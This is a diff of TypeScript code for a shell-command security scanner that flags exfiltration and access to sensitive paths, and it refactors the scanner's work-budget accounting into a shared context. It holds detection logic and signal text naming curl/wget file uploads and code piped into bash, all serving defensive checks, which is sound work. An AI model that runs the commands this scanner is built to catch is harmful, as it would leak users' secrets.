-  for (const stage of state.xargsUpstream ?? []) {
-    state.spend?.(1, stage.source.raw.length);
-    for (const cmd of commandsIn(stage)) {
+  const upstream = state.xargsUpstream;
+  if (upstream === undefined) return null;
+  const key = cwds.join("\0");
+  for (let index = upstream.checked.get(key) ?? 0; index < upstream.length; index += 1) {
+    const cmd = upstream.commands[index]!;
       for (const word of cmd.words.slice(1)) {
-        state.spend?.(1, word.source.raw.length);
+
         if (literalHead(word).startsWith("-")) continue;
         let hit: string | null = null;
         scanEachHome((home) => {
@@ -1232,27 +1239,27 @@ function xargsUpstreamReach(state: ScanState): string | null {
           const firstWild = segments.findIndex(hasWildcard);
           const root = unescapeGlob((firstWild < 0 ? segments : segments.slice(0, firstWild)).join("/")) || (glob.startsWith("/") ? "/" : ".");
           for (const base of isAbsolute(root) ? [undefined] : cwds) {
-            state.spend?.(1);
+
             hit ??= reaches(isAbsolute(root) ? root : resolve(base!, root));
           }
         });
         if (hit) return hit;
       }
-    }
   }
+  upstream.checked.set(key, upstream.length);
   return null;
 }
 
 function searchRoot(absolute: string, shape: SearchShape, state: ScanState): void {
-  state.spend?.(1, absolute.length);
-  const canonical = caseFoldForMatch(canonicalFloorPath(absolute, state.workBudget));
+
+  const canonical = caseFoldForMatch(canonicalFloorPath(absolute, state.context));
   // A content search reads every file below its root.
-  const above = shape.ancestorFloor ? sensitiveLocationUnder(canonical) : null;
+  const above = shape.ancestorFloor ? state.context.locationUnder(canonical) : null;
   if (above) { state.sensitive = `recursive search of ${absolute} reaches ${above}`; return; }
   if (shape.follow) {
     // A followed root link counts like any other followed link.
     const lexical = caseFoldForMatch(foldCanonicalPathSeparators(absolute));
-    const viaLink = canonical !== lexical ? state.match(canonical) ?? sensitiveLocationUnder(canonical) : null;
+    const viaLink = canonical !== lexical ? state.match(canonical) ?? state.context.locationUnder(canonical) : null;
     if (viaLink) { state.sensitive = `search root ${absolute} links to ${viaLink}`; return; }
   }
   if (shape.follow === "all") {
@@ -1276,7 +1283,7 @@ function markCwdUnknown(state: ScanState, reason: string): void {
 }
 
 function addCwd(state: ScanState, directory: string): void {
-  state.spend?.(state.cwds.length + 1, directory.length);
+
   if (state.cwds.includes(directory)) return;
   if (state.cwds.length >= CWD_CANDIDATE_LIMIT) {
     markCwdUnknown(state, "too many directory changes to track");
@@ -1299,7 +1306,7 @@ function cdTargets(word: ShellWord, state: ScanState, cdpath = true, prefix = ""
 }
 
 function cdTargetsUnder(word: ShellWord, state: ScanState, home: () => string, cdpath: boolean, prefix: string): string[] | string {
-  state.spend?.(state.cwds.length + 1, word.source.raw.length);
+
   const whole = wordGlob(word, home);
   if (whole === null || whole.includes(DYNAMIC_SEGMENT)) return "cd target is not static";
   // An attached option value (`-Cdir`, `--chdir=dir`) follows its option text.
@@ -1357,11 +1364,11 @@ function applyCommandCwdSwitch(cmd: ShellCommand, state: ScanState): (() => void
   const switched: string[] = [];
   let unknown: string | undefined;
   for (let start = 0; start < cmd.words.length; start += 1) {
-    state.spend?.(1);
+
     const grammar = argv[start] === undefined ? undefined : CWD_SWITCHES[program(argv[start])!.toLowerCase()];
     if (!grammar) continue;
     for (let index = start + 1; index < cmd.words.length; index += 1) {
-      state.spend?.(1, cmd.words[index]!.source.raw.length);
+
       const head = literalHead(cmd.words[index]!);
       if (head === "--") break;
       if (!head.startsWith("-")) {
@@ -1404,7 +1411,7 @@ function isXargsCommand(cmd: ShellCommand): boolean {
 function trackDirectoryChange(cmd: ShellCommand, state: ScanState): void {
   let words = cmd.words;
   for (;;) {
-    state.spend?.(1);
+
     const head = words[0] === undefined ? undefined : staticShellWord(words[0]);
     if (head === "builtin") { words = words.slice(1); continue; }
     if (head === "command") {
@@ -1428,7 +1435,7 @@ function trackDirectoryChange(cmd: ShellCommand, state: ScanState): void {
   const operands: ShellWord[] = [];
   let delimited = false;
   for (const word of words.slice(1)) {
-    state.spend?.(1, word.source.raw.length);
+
     const text = staticShellWord(word);
     if (!delimited && text === "--") { delimited = true; continue; }
     // `-L -P -e -@` (cd) and `-n` (pushd/popd) are options; `-` and `-N` are operands.
@@ -1471,7 +1478,7 @@ function trackDirectoryChange(cmd: ShellCommand, state: ScanState): void {
 function scanUntilCwdStable(scan: () => void, state: ScanState): void {
   let version: number;
   do {
-    state.spend?.(1);
+
     version = state.cwdVersion;
     scan();
   } while (version !== state.cwdVersion && !state.sensitive);
@@ -1481,7 +1488,7 @@ function scanUntilCwdStable(scan: () => void, state: ScanState): void {
 function scanGitObjectPaths(cmd: ShellCommand, state: ScanState): void {
   if (state.sensitive || program(staticShellWord(cmd.words[0]!))?.toLowerCase() !== "git") return;
   for (const word of cmd.words.slice(1)) {
-    state.spend?.(1, word.source.raw.length);
+
     const text = staticShellWord(word);
     if (text === undefined || text.startsWith("-")) continue;
     const object = /^[^:]*:(?!\/\/)(.+)$/.exec(text);
@@ -1491,11 +1498,10 @@ function scanGitObjectPaths(cmd: ShellCommand, state: ScanState): void {
 }
 
 function scanStatement(statement: ShellStatement, state: ScanState): void {
-  state.spend?.(1, statement.source.raw.length);
+
   switch (statement.kind) {
     case "command": {
-      // Reserve the bounded whole-argv passes before option, code and redirect views run.
-      state.spend?.(statement.words.length * 4 + statement.assignments.length + statement.redirects.length);
+
       // `env -C`, `git -C`, `make -C`, `tar -C`, `--prefix` … move this command alone.
       const restoreCwd = applyCommandCwdSwitch(statement, state);
       const metadataListing = state.metadataListing;
@@ -1512,7 +1518,7 @@ function scanStatement(statement: ShellStatement, state: ScanState): void {
         // Embedded literal paths remain a floor without a program-option model. Here-document data is inspected as code only when the recipient runs it.
         for (const word of statement.words) {
           const text = staticShellWord(word) ?? word.source.raw;
-          if (!isNonFileUrlArgument(text)) scanCodeText(text, state);
+          if (!isNonFileUrlArgument(text)) scanWordCodeText(word, state);
         }
       }
       if (statement.words.length > 0 && isNetworkProgram(commandArgv(statement))) state.network = true;
@@ -1537,18 +1543,27 @@ function scanStatement(statement: ShellStatement, state: ScanState): void {
       return;
     }
     case "pipeline": {
-      // A stage fed code by an earlier one (`echo '…' | bash`): the feeders' text is that code.
-      const stages = statement.statements.flatMap(commandsIn);
+      const groups = statement.statements.map(commandsIn);
+      const stages = groups.flat();
       if (stages.some(needsCodeTextScan)) for (const stage of stages) scanCodeOf(stage, state);
-      // A stage whose output `xargs` turns into arguments hands its listing on as reads.
-      statement.statements.forEach((child, index) => {
+      const hasXargs = groups.map((group) => group.some(isXargsCommand));
+      const suffixXargs = new Array<boolean>(groups.length);
+      let later = false;
+      for (let index = groups.length - 1; index >= 0; index -= 1) {
+        suffixXargs[index] = later;
+        later ||= hasXargs[index]!;
+      }
+      const upstream: ShellCommand[] = [];
+      const checked = new Map<string, number>();
+      for (let index = 0; index < statement.statements.length; index += 1) {
         const { feedsXargs, xargsUpstream } = state;
-        state.feedsXargs = statement.statements.slice(index + 1).some((later) => commandsIn(later).some(isXargsCommand));
-        state.xargsUpstream = commandsIn(child).some(isXargsCommand) ? statement.statements.slice(0, index) : undefined;
-        scanStatement(child, state);
+        state.feedsXargs = suffixXargs[index]!;
+        state.xargsUpstream = hasXargs[index] ? { commands: upstream, length: upstream.length, checked } : undefined;
+        scanStatement(statement.statements[index]!, state);
         state.feedsXargs = feedsXargs;
         state.xargsUpstream = xargsUpstream;
-      });
+        upstream.push(...groups[index]!);
+      }
       state.cdSuccess = undefined;
       return;
     }
@@ -1628,18 +1643,21 @@ function boundedInspectionText(command: string): string {
   return `${command.slice(0, half)} ${command.slice(-half)}`;
 }
 
-const floorWorkBudgets = new WeakMap<ParsedShellCommand, ShellFloorWorkBudget>();
+const floorContexts = new WeakMap<ParsedShellCommand, ShellFloorContext>();
 
 function scanStateFor(parsed: ParsedShellCommand, cwd: string | undefined): ScanState {
-  const workBudget = floorWorkBudgets.get(parsed) ?? new ShellFloorWorkBudget();
-  floorWorkBudgets.set(parsed, workBudget);
-  return shellFact(parsed, `scan-state\0${cwd ?? ""}`, () => createScanState(cwd, /dotglob|GLOBIGNORE/.test(parsed.command), undefined, parsed.command, workBudget));
+  const context = floorContexts.get(parsed) ?? new ShellFloorContext();
+  floorContexts.set(parsed, context);
+  return shellFact(parsed, `scan-state\0${cwd ?? ""}`, () => {
+    const text = shellFloorInspectionText(parsed);
+    return createScanState(cwd, /dotglob|GLOBIGNORE/.test(text), text, context);
+  });
 }
 
 function scanParsedInto(parsed: ParsedShellCommand, state: ScanState): void {
   if (!parsed.analysis.ok) {
     if (shellFloorParserBudgetExceeded(parsed.analysis.reason)) {
-      throw new ShellScanBudgetError(SHELL_FLOOR_BUDGET_REASON);
+      throw new ShellScanLimitError(SHELL_FLOOR_BUDGET_REASON);
     }
     const visible = boundedInspectionText(parsed.command);
     state.ordinaryAsk ??= parsed.analysis.reason;
@@ -1682,10 +1700,10 @@ function staticFeederText(cmd: ShellCommand): string | undefined {
 }
 
 function signalFor(command: string, ctx: Context): string | null {
-  ctx.scan.spend?.(1, command.length);
-  if (shellFloorInputExceeded(command)) throw new ShellScanBudgetError(SHELL_FLOOR_BUDGET_REASON);
-  const parsed = floorParsedCommand(command, ctx.scan.workBudget);
-  floorWorkBudgets.set(parsed, ctx.scan.workBudget);
+
+  if (shellFloorInputExceeded(command)) throw new ShellScanLimitError(SHELL_FLOOR_BUDGET_REASON);
+  const parsed = floorParsedCommand(command, ctx.scan.context);
+  floorContexts.set(parsed, ctx.scan.context);
   const specific = signalForParsed(parsed, ctx);
   if (specific) return specific;
   scanParsedInto(parsed, ctx.scan);
@@ -1695,7 +1713,7 @@ function signalFor(command: string, ctx: Context): string | null {
 function signalForParsed(parsed: ParsedShellCommand, ctx: Context): string | null {
   const { command, analysis } = parsed;
   if (!analysis.ok) {
-    if (shellFloorParserBudgetExceeded(analysis.reason)) throw new ShellScanBudgetError(SHELL_FLOOR_BUDGET_REASON);
+    if (shellFloorParserBudgetExceeded(analysis.reason)) throw new ShellScanLimitError(SHELL_FLOOR_BUDGET_REASON);
     const visible = boundedInspectionText(command);
     return UNPARSED_FALLBACK.test(visible) || UNPARSED_FILE_SOURCE.test(visible) ? "curl/wget body from a file (unparsed)" : null;
   }
@@ -1704,8 +1722,8 @@ function signalForParsed(parsed: ParsedShellCommand, ctx: Context): string | nul
 }
 
 // The exfiltration signal for a shell command, or `null`. `cwd` resolves relative path arguments for the sensitive-path check. Pass a ParsedShellCommand to share one parse with the other consumers.
-export function shellExfiltrationSignal(input: ShellCommandInput, cwd?: string, budget?: ShellFloorWorkBudget): string | null {
-  return withFloorWork(input, budget, SHELL_FLOOR_BUDGET_REASON, (parsed) => shellFact(parsed, `exfiltration\0${cwd ?? ""}`, () => {
+export function shellExfiltrationSignal(input: ShellCommandInput, cwd?: string, context?: ShellFloorContext): string | null {
+  return withFloorContext(input, context, SHELL_FLOOR_BUDGET_REASON, (parsed) => shellFact(parsed, `exfiltration\0${cwd ?? ""}`, () => {
     const specific = signalForParsed(parsed, { cwd, depth: 0, tainted: new Set(), scan: scanStateFor(parsed, cwd) });
     if (specific) return specific;
     return readerIndependentSignal(scanCommand(parsed, cwd));
@@ -1714,7 +1732,7 @@ export function shellExfiltrationSignal(input: ShellCommandInput, cwd?: string, 
 
 // The sensitive-path floor for shell commands, or `null`: a sensitive or secret path anywhere in the command line (same normalization as the exfiltration scan). Never allowed by a rule; asks in every mode.
 export function shellSensitivePathSignal(input: ShellCommandInput, cwd?: string): string | null {
-  return withFloorWork(input, undefined, SHELL_FLOOR_BUDGET_REASON, (parsed) => {
+  return withFloorContext(input, undefined, SHELL_FLOOR_BUDGET_REASON, (parsed) => {
     const hit = scanCommand(parsed, cwd).sensitive;
     return hit ? `sensitive path argument (${hit})` : null;
   });
@@ -1722,7 +1740,7 @@ export function shellSensitivePathSignal(input: ShellCommandInput, cwd?: string)
 
 // Exact rules require complete analysis and a canonical directory; indirect input remains an accepted limit.
 export function shellScanProofBlocker(input: ShellCommandInput, cwd?: string): string | null {
-  return withFloorWork(input, undefined, SHELL_FLOOR_BUDGET_REASON, (parsed) => {
+  return withFloorContext(input, undefined, SHELL_FLOOR_BUDGET_REASON, (parsed) => {
     if (!parsed.analysis.ok) return parsed.analysis.reason;
     const scan = scanCommand(parsed, cwd);
     return scan.ordinaryAsk ?? scan.cdAsk ?? null;
@@ -1731,85 +1749,58 @@ export function shellScanProofBlocker(input: ShellCommandInput, cwd?: string): s
 
 // Incomplete path inspection is an ordinary ask, never credential evidence.
 export function shellScanOrdinaryAsk(input: ShellCommandInput, cwd?: string): string | null {
-  return withFloorWork(input, undefined, SHELL_FLOOR_BUDGET_REASON, (parsed) => {
+  return withFloorContext(input, undefined, SHELL_FLOOR_BUDGET_REASON, (parsed) => {
     if (!parsed.analysis.ok) return parsed.analysis.reason;
     const scan = scanCommand(parsed, cwd);
     return scan.ordinaryAsk ?? scan.cdAsk ?? scan.confinedAsk ?? null;
   });
 }
 
-function withFloorWork<T>(input: ShellCommandInput, budget: ShellFloorWorkBudget | undefined, closed: T, inspect: (parsed: ParsedShellCommand) => T): T {
-  if (shellFloorInputExceeded(input) || budget?.exhausted) return closed;
-  const existing = typeof input === "string" ? undefined : floorWorkBudgets.get(input);
-  const work = existing ?? budget ?? new ShellFloorWorkBudget();
-  if (work.exhausted) return closed;
+function withFloorContext<T>(input: ShellCommandInput, context: ShellFloorContext | undefined, closed: T, inspect: (parsed: ParsedShellCommand) => T): T {
+  if (shellFloorInputExceeded(input)) return closed;
   try {
-    const parsed = parseShellFloorCommand(input, work);
+    const parsed = context === undefined ? parseShellFloorCommand(input) : floorParsedCommand(input, context);
     return inspect(parsed);
   } catch (error) {
-    if (error instanceof ShellFloorWorkBudgetError) {
-      work.exhausted = true;
-      return closed;
-    }
+    if (error instanceof ShellFloorLimitError) return closed;
     throw error;
   }
 }
 
-export function parseShellFloorCommand(input: ShellCommandInput, budget: ShellFloorWorkBudget, maxInputLength = 8_000): ParsedShellCommand {
-  budget.spend(0);
-  if ((typeof input === "string" ? input : input.command).length > maxInputLength && shellFloorInputExceeded(input)) {
-    budget.exhausted = true;
-    throw new ShellScanBudgetError(SHELL_FLOOR_BUDGET_REASON);
-  }
-  if (typeof input !== "string" && floorWorkBudgets.get(input) === budget) return input;
-  const parsed = floorParsedCommand(input, budget);
-  floorWorkBudgets.set(parsed, budget);
-  if (!parsed.analysis.ok && shellFloorParserBudgetExceeded(parsed.analysis.reason)) {
-    budget.exhausted = true;
-    throw new ShellScanBudgetError(SHELL_FLOOR_BUDGET_REASON);
-  }
-  return parsed;
-}
-
-// Already parsed inputs retain their original grammar and argv records. Enforce
-// the same command bound without invoking a second parse or reading source text.
-function checkParsedCommandWork(program: ShellStatement, budget: ShellFloorWorkBudget): void {
-  const pending: object[] = [program];
-  while (pending.length > 0) {
-    budget.spend();
-    const node = pending.pop()!;
-    if ("kind" in node && node.kind === "command" && "words" in node && Array.isArray(node.words)) budget.checkCommandTokens(node.words.length);
-    for (const value of Object.values(node)) {
-      budget.spend();
-      if (value !== null && typeof value === "object") pending.push(value);
-    }
-  }
-}
-
-// Floor work has its own input bound; the literal-rule parser's smaller limit does not truncate sandbox inspection.
-function floorParsedCommand(input: ShellCommandInput, budget: ShellFloorWorkBudget): ParsedShellCommand {
+export function parseShellFloorCommand(input: ShellCommandInput, maxInputLength = 8_000): ParsedShellCommand {
+  if ((typeof input === "string" ? input : input.command).length > maxInputLength && shellFloorInputExceeded(input)) throw new ShellScanLimitError(SHELL_FLOOR_BUDGET_REASON);
   if (typeof input !== "string" && (input.analysis.ok || input.analysis.reason !== "literal command length limit exceeded")) {
-    budget.enterSource(input.command);
-    if (input.analysis.ok) checkParsedCommandWork(input.analysis.program, budget);
+    if (input.analysis.ok && input.analysis.totalTokens !== undefined && input.analysis.totalTokens > MAX_SHELL_ANALYSIS_TOKENS) throw new ShellScanLimitError(SHELL_FLOOR_BUDGET_REASON);
     return input;
   }
   const command = typeof input === "string" ? input : input.command;
   try {
-    return { command, analysis: analyzeShell(command, "bash", budget.parserWorkLimits(command)), facts: new Map() };
-  } catch (error) {
-    if (error instanceof ShellFloorWorkBudgetError) throw error;
-    return { command, analysis: { ok: false, reason: "shell parser failed" }, parserError: error, facts: new Map() };
+    const analysis = analyzeShell(command, "bash", { totalTokens: MAX_SHELL_ANALYSIS_TOKENS });
+    if (!analysis.ok && shellFloorFallbackInputExceeded(command)) return { command, analysis: { ok: false, reason: "Shell analysis total token limit exceeded" }, facts: new Map() };
+    return { command, analysis, facts: new Map() };
   }
+  catch (error) { return { command, analysis: { ok: false, reason: "shell parser failed" }, parserError: error, facts: new Map() }; }
 }
 
-export function inspectShellCommand(input: ShellCommandInput, cwd?: string, budget?: ShellFloorWorkBudget): ShellFloorSignals {
-  return withFloorWork(input, budget, shellFloorBudgetSignals(), (parsed) => shellFact(parsed, `floor-signals\0${cwd ?? ""}`, () => {
-      const exfiltration = shellExfiltrationSignal(parsed, cwd);
-      if (exfiltration === SHELL_FLOOR_BUDGET_REASON) return shellFloorBudgetSignals();
-      const sensitive = shellSensitivePathSignal(parsed, cwd);
-      if (sensitive === SHELL_FLOOR_BUDGET_REASON) return shellFloorBudgetSignals();
-      const scan = scanCommand(parsed, cwd);
-      const ordinaryAsk = scan.ordinaryAsk ?? scan.cdAsk ?? scan.confinedAsk;
-      return { sensitive, exfiltration, ...(ordinaryAsk ? { ordinaryAsk } : {}) };
+function floorParsedCommand(input: ShellCommandInput, context: ShellFloorContext): ParsedShellCommand {
+  const key = typeof input === "string" ? `bash-parse\0${input}` : undefined;
+  const cached = key === undefined ? undefined : context.facts.get(key) as ParsedShellCommand | undefined;
+  if (cached !== undefined) return cached;
+  const parsed = parseShellFloorCommand(input);
+  floorContexts.set(parsed, context);
+  if (key !== undefined) context.facts.set(key, parsed);
+  return parsed;
+}
+
+export function inspectShellCommand(input: ShellCommandInput, cwd?: string, context?: ShellFloorContext): ShellFloorSignals {
+  return withFloorContext(input, context, shellFloorBudgetSignals(), (parsed) => shellFact(parsed, `floor-signals\0${cwd ?? ""}`, () => {
+    if (!parsed.analysis.ok && shellFloorParserBudgetExceeded(parsed.analysis.reason)) return shellFloorBudgetSignals();
+    const exfiltration = shellExfiltrationSignal(parsed, cwd);
+    if (exfiltration === SHELL_FLOOR_BUDGET_REASON) return shellFloorBudgetSignals();
+    const sensitive = shellSensitivePathSignal(parsed, cwd);
+    if (sensitive === SHELL_FLOOR_BUDGET_REASON) return shellFloorBudgetSignals();
+    const scan = scanCommand(parsed, cwd);
+    const ordinaryAsk = scan.ordinaryAsk ?? scan.cdAsk ?? scan.confinedAsk;
+    return { sensitive, exfiltration, ...(ordinaryAsk ? { ordinaryAsk } : {}) };
   }));
 }
